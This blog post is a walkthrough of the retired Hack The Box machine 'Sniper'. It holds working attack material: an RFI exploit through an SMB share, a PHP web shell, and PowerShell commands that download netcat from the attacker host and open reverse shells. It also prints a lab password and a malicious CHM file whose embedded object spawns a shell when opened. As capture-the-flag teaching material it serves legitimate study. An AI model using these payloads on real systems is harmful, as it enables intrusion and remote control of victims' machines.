---
layout: post
title: "Sniper: Hack The Box Walkthrough"
date: 2020-03-28 15:26:47 +0000
last_modified_at: 2020-03-28 15:26:47 +0000
category: Walkthrough
tags: ["Hack The Box", Sniper, retired, Windows, Medium]
comments: true
image:
  feature: sniper-htb-walkthrough.jpg
  credit: Military_Material / Pixabay
  creditlink: https://pixabay.com/photos/marines-sniper-rifle-aiming-scope-2660088/
---

This post documents the complete walkthrough of Sniper, a retired vulnerable [VM][1] created by [felamos][2] and [MinatoTW][3], and hosted at [Hack The Box][4]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Sniper is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.151 --rate=1000

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-10-10 10:03:09 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 49667/tcp on 10.10.10.151                                 
Discovered open port 139/tcp on 10.10.10.151                                   
Discovered open port 80/tcp on 10.10.10.151                                    
Discovered open port 135/tcp on 10.10.10.151                                   
Discovered open port 445/tcp on 10.10.10.151
```

Nothing unusual with this list of open ports. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p80,135,139,445 -A --reason -oN nmap.txt 10.10.10.151
...
PORT    STATE SERVICE       REASON          VERSION
80/tcp  open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Sniper Co.
135/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds? syn-ack ttl 127
```

Seems pretty water-tight to me. Also, it appears that the `http` service is the only way to go. Hers's how it looks like.

<a class="image-popup">
![119c0bd3.png](/assets/images/posts/sniper-htb-walkthrough/119c0bd3.png)
</a>

Looks good.

### Directory/File Enumeration

Let's fuzz the site with `gobuster` and see what we can find out.

```
# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 20 -x php,html -u http://10.10.10.151/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.151/
[+] Threads:        20
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,html
[+] Timeout:        10s
===============================================================
2019/10/11 08:59:09 Starting gobuster
===============================================================
/Blog (Status: 301)
/Images (Status: 301)
/Index.php (Status: 200)
/blog (Status: 301)
/css (Status: 301)
/images (Status: 301)
/index.php (Status: 200)
/index.php (Status: 200)
/js (Status: 301)
/user (Status: 301)
===============================================================
2019/10/11 09:01:35 Finished
===============================================================
```

There are two directories of interest: `/blog` and `/user`.

_`/blog`_

<a class="image-popup">
![988dff51.png](/assets/images/posts/sniper-htb-walkthrough/988dff51.png)
</a>

_`/user`_

<a class="image-popup">
![9865b1f5.png](/assets/images/posts/sniper-htb-walkthrough/9865b1f5.png)
</a>

### File Inclusion Vulnerability

A file inclusion vulnerability was quickly spotted in the `lang` parameter of `/blog/index.php`.

<a class="image-popup">
![d563d6cc.png](/assets/images/posts/sniper-htb-walkthrough/d563d6cc.png)
</a>

The file `blog-en.php` is present.

<a class="image-popup">
![616da67e.png](/assets/images/posts/sniper-htb-walkthrough/616da67e.png)
</a>

Long story short. I verified that remote file inclusion attack doesn't work for HTTP. Maybe it'll work for SMB? With that in mind, let's set up a public share with Samba.

<div class="filename"><span>smb.conf</span></div>

```
[global]
workgroup = WORKGROUP
server string = Samba Server %v
netbios name = kali
security = user
map to guest = bad user
name resolve order = bcast host
dns proxy = no
bind interfaces only = yes

# add to the end
[evil]
   path = /root/Downloads/sniper/tmp
   writable = yes
   guest ok = yes
   guest only = yes
   read only = no
   create mode = 0777
   directory mode = 0777
   force user = nobody
```

Let's put in the following file in that share and start the service.

```
echo '<?php phpinfo(); ?>' > info.php && systemctl start smbd
```

<a class="image-popup">
![e6415fb0.png](/assets/images/posts/sniper-htb-walkthrough/e6415fb0.png)
</a>

Awesome!

## Low-Privilege Shell

We should now be able to put in another PHP file that executes commands remotely.

<div class="filename"><span>cmd.php</span></div>

```php
<?php echo shell_exec($_GET[0]); ?>
```

<a class="image-popup">
![62f39630.png](/assets/images/posts/sniper-htb-walkthrough/62f39630.png)
</a>

And because there's HTML mixed inside the output, I wrote a simple bash script to tidy up the output.

<div class="filename"><span>tidy.sh</span></div>

```shell
#!/bin/bash

HOST=10.10.10.151
CMD=$(urlencode $1)
READ="//10.10.15.171/evil/cmd.php"
#READ="${READ//\\/\/}"

curl -s \
     "http://$HOST/blog/index.php?lang=$READ&0=$CMD" \
| sed '1,60d' \
| head -n -3
```

<a class="image-popup">
![f53edaf5.png](/assets/images/posts/sniper-htb-walkthrough/f53edaf5.png)
</a>

See? So much neater! Now, let's see how we can get a reverse shell. I used the following command to download a copy of `nc.exe` from Kali Linux to `C:\Windows\System32\spool\drivers\color`.

```
# ./tidy.sh 'powershell /c iwr http://10.10.15.171/nc.exe -outf \windows\system32\spool\drivers\color\cute.exe'
```

<a class="image-popup">
![773212b4.png](/assets/images/posts/sniper-htb-walkthrough/773212b4.png)
</a>

Sweet. It's there. Let's get our reverse shell.

```
# ./tidy.sh 'start \windows\system32\spool\drivers\color\cute.exe 10.10.15.171 1234 -e cmd.exe'
```

<a class="image-popup">
![a45965d7.png](/assets/images/posts/sniper-htb-walkthrough/a45965d7.png)
</a>

There you have it.

## Privilege Escalation

During enumeration of the `iusr` account, I found the password of `Chris` in `C:\inetpub\wwwroot\user\db.php`. And guesss what, `Chris` is able to perform PowerShell Remoting.

<a class="image-popup">
![022b35d8.png](/assets/images/posts/sniper-htb-walkthrough/022b35d8.png)
</a>

Armed with the credentials of Chris, I can get myself a reverse shell as `Chris` and no surprise, the file `user.txt` in in `Chris`'s desktop.

### Getting `user.txt`

But how, I hear you asking. Well, like this.

```
> $pw = ConvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force
> $cred = New-Object System.Management.Automation.PSCredential("snipe\chris", $pw)
> Enter-PSSession -ComputerName SNIPER -Credential $cred
> Start-Process -FilePath "\windows\system32\spool\drivers\color\cute.exe" -ArgumentList "10.10.15.171 4321 -e cmd.exe" -NoNewWindow
```

<a class="image-popup">
![8bb702a1.png](/assets/images/posts/sniper-htb-walkthrough/8bb702a1.png)
</a>

### Getting `root.txt`

During enumeration of `Chris`'s account, I saw an `instructions.chm` lamenting the life of a developer and an evil boss like so.

<a class="image-popup">
![455f2f0d.png](/assets/images/posts/sniper-htb-walkthrough/455f2f0d.png)
</a>

There's also another` note.txt` that depicts a boss who has a rather low opinion of Chris.

```
Hi Chris,                                                                                           
        Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

Regards,
Sniper CEO.                                                                                         
```

I did an experiment. I copied `instructions.chm` and dropped it into `C:\Docs`. Within a minute, the file got mysteriously removed. If I had to guess, I would say that this is a client-side exploit and I need a malicious CHM [file](https://twitter.com/ithurricanept/status/534993743196090368?lang=en).

I extracted `a.html` from `instructions.chm`, modified it, and using `hhc.exe` (Microsoft HTML Help Workshop and Documentation), I was able to compile my malicious CHM file.

<a class="image-popup">
![9459d742.png](/assets/images/posts/sniper-htb-walkthrough/9459d742.png)
</a>

<div class="filename"><span>a.html</span></div>

```
<html>
<body>
<h1>Sniper Android App Documentation</h1>

<h2>Table of Contents</h2>

<p>Pff... This dumb CEO always makes me do all the shitty work. SMH!</p>
<p>I'm never completing this thing. Gonna leave this place next week. Hope someone snipes him.</p>

<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
  <PARAM name="Command" value="ShortCut">
  <PARAM name="Button" value="Bitmap::shortcut">
  <PARAM name="Item1" value=',cmd,/c start c:\temp\cute.exe 10.10.15.171 8888 -e cmd.exe'>
  <PARAM name="Item2" value="273,1,1">
</OBJECT>
<SCRIPT>
  x.Click();
</SCRIPT>

</body>
</html>
```

For the record, I transfered the `nc.exe` I had earlier to `C:\Temp`. To compile the CHM file, I need a project file. It's a ridiculously simple file.

<div class="filename"><span>evil.hpp</span></div>

```
[FILES]
C:\Users\bernard\Downloads\a.html
```

Let's compile it.

<a class="image-popup">
![3e1f63f1.png](/assets/images/posts/sniper-htb-walkthrough/3e1f63f1.png)
</a>

Time to drop the file into `C:\Docs`.

```
PS C:\Docs> iwr http://10.10.15.171/evil.chm -outf .\instructions.chm
```

Seconds later, a reverse shell with power appear...

<a class="image-popup">
![1468d8cf.png](/assets/images/posts/sniper-htb-walkthrough/1468d8cf.png)
</a>

Getting `root.txt` is trivial.

<a class="image-popup">
![1e500d4c.png](/assets/images/posts/sniper-htb-walkthrough/1e500d4c.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/211
[2]: https://www.hackthebox.eu/home/users/profile/27390
[3]: https://www.hackthebox.eu/home/users/profile/8308
[4]: https://www.hackthebox.eu/
